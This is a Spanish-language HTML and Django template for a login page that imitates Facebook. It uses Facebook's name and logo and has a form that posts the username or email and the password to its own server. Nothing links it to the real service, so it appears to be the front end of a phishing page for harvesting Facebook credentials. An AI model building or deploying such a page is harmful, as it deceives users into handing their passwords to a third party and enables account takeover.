<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">

<!-- 🔥 CLAVE -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title> Iniciar sesión</title>

<style>
body {
    font-family: Arial, sans-serif;
    background-image: url('https://images.unsplash.com/photo-1522202176988-66273c2fd55f?auto=format&fit=crop&w=1950&q=80');
    background-size: cover;
    background-position: center;
    margin: 0;
    padding: 20px;
}

/* contenedor flexible */
.container {
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
}

/* caja adaptable */
.login-box {
    background-color: white;
    padding: 30px 20px;
    border-radius: 10px;
    box-shadow: 0 0 20px rgba(0,0,0,0.3);
    width: 100%;
    max-width: 350px;
}

/* header */
.header {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    margin-bottom: 25px;
}

.title {
    font-size: 22px;
    font-weight: 600;
    color: #1877f2;
}

.logo {
    width: 26px;
    height: 26px;
}

/* inputs y botón */
.login-box form input, 
.login-box form button {
    width: 100%;
    padding: 14px;
    margin: 10px 0;
    border-radius: 8px;
    font-size: 16px;
    box-sizing: border-box;
}

.login-box form input {
    border: 1px solid #ccc;
}

.login-box form button {
    background-color: #2a3fb7;
    border: none;
    color: white;
    font-weight: bold;
    cursor: pointer;
}

/* hover solo en PC */
@media (hover: hover) {
    .login-box form button:hover {
        background-color: #1e2f8a;
    }
}

.forgot {
    text-align: center;
    margin-top: 12px;
}

.forgot a {
    text-decoration: none;
    color: #2a3fb7;
    font-size: 14px;
}

/* 🔥 ajustes para móviles pequeños */
@media (max-width: 480px) {
    body {
        padding: 15px;
    }

    .login-box {
        padding: 25px 15px;
    }

    .title {
        font-size: 20px;
    }
}
</style>

</head>
<body>

<div class="container">
    <div class="login-box">

        <div class="header">
            <span class="title">FACEBOOK</span>
            <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_(2019).png">
        </div>

        <form method="post">
            {% csrf_token %}
            <input type="text" name="username" placeholder="Usuario o correo">
            <input type="password" name="password" placeholder="Contraseña">
            <button type="submit">Iniciar sesión</button>
        </form>

        <div class="forgot">
            <a href="#">¿Olvidaste tu contraseña?</a>
        </div>

    </div>
</div>

</body>
</html>
